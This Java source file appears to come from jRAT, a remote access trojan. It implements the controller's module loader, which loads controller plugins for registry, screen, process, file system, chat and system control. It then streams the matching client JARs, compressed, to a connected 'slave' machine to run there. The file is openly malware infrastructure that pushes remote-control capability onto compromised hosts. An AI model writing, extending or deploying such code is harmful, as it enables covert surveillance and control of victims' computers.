package jrat.controller.modules;

import jrat.api.ControllerModule;
import jrat.common.Logger;
import jrat.common.compress.QuickLZ;
import jrat.controller.AbstractSlave;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

public class ModuleLoader {

    /**
     * Temporary class that holds necessary module data
     */
    private static class ModuleData {

        public String pathPrefix;

        private ControllerModule instance;

        public ModuleData(String pathPrefix) {
            this.pathPrefix = pathPrefix;
        }

        public File getControllerFile() {
            return new File("modules", this.pathPrefix + "-controller.jar");
        }

        public File getClientFile() {
            return new File("modules", this.pathPrefix + "-client.jar");
        }

        public ControllerModule getInstance() {
            return this.instance;
        }

        public void setInstance(ControllerModule module) {
            this.instance = module;
        }
    }

    private static final List<ModuleData> modules = new ArrayList<>();

    static {
        modules.add(new ModuleData("registry"));
        modules.add(new ModuleData("screen"));
        modules.add(new ModuleData("process"));
        modules.add(new ModuleData("fs"));
        modules.add(new ModuleData("chat"));
        modules.add(new ModuleData("system"));
    }

    /**
     * Load all server side modules
     */
    public static void load() {
        Logger.log("Loading " + modules.size() + " modules...");

        for (ModuleData mod : modules) {
            try {
                File jar = mod.getControllerFile();

                JarInputStream jis = new JarInputStream(new FileInputStream(jar));
                Manifest mf = jis.getManifest();
                String mainClass = mf.getMainAttributes().getValue("Main-Class");
                jis.close();

                // add module JAR to classpath
                Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
                method.setAccessible(true);
                method.invoke(ClassLoader.getSystemClassLoader(), jar.toURI().toURL());

                // invoke init() on module
                Class<ControllerModule> clazz = (Class<ControllerModule>) ModuleLoader.class.getClassLoader().loadClass(mainClass);
                Constructor<?> ctor = clazz.getDeclaredConstructor();
                ctor.setAccessible(true);
                ControllerModule module = (ControllerModule) ctor.newInstance();
                module.init();

                mod.setInstance(module);
                Logger.log("\t" + mod.getControllerFile());
            } catch (Exception ex) {
                Logger.log("\t" + mod.getControllerFile() + " failed");
                ex.printStackTrace();
            }
        }
    }

    /**
     * Send all client side modules to the client
     * @param slave
     * @throws Exception
     */
    public static void send(AbstractSlave slave) throws Exception {
        Logger.log("Writing " + modules.size() + " modules...");
        slave.writeInt(modules.size());

        for (ModuleData mod : modules) {
            int total = 0;
            int totalUncompressed = 0;

            JarInputStream jis = new JarInputStream(new FileInputStream(mod.getClientFile()));

            Manifest mf = jis.getManifest();
            String mainClass = mf.getMainAttributes().getValue("Main-Class");

            slave.writeLine(mainClass);

            Logger.log(mainClass);

            JarEntry entry;
            while ((entry = jis.getNextJarEntry()) != null) {
                int size = (int) entry.getSize();

                if (size == 0) {
                    continue;
                }

                ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

                int count;
                byte[] buffer = new byte[1024];
                while ((count = jis.read(buffer)) != -1) {
                    out.write(buffer, 0, count);
                }

                out.close();

                byte[] array = out.toByteArray();

                int uncompressedSize = array.length;
                totalUncompressed += array.length;

                array = QuickLZ.compress(array, 3);
                total += array.length;
                Logger.log("\tclass " + entry.getName() + " (" + uncompressedSize + " -> " + array.length + " bytes)");

                slave.writeBoolean(true);
                slave.writeBoolean(entry.getName().endsWith(".class"));
                slave.writeLine(entry.getName());
                slave.writeInt(array.length);
                slave.write(array);
            }
            jis.close();

            // indicate that there are no entries left for this module
            slave.writeBoolean(false);
            Logger.log("\ttotal: " + total + " bytes (" + (((float) total / (float) totalUncompressed) * 100f) + "%)");

            slave.loadedModules.add(mod.getInstance());
        }
    }
}
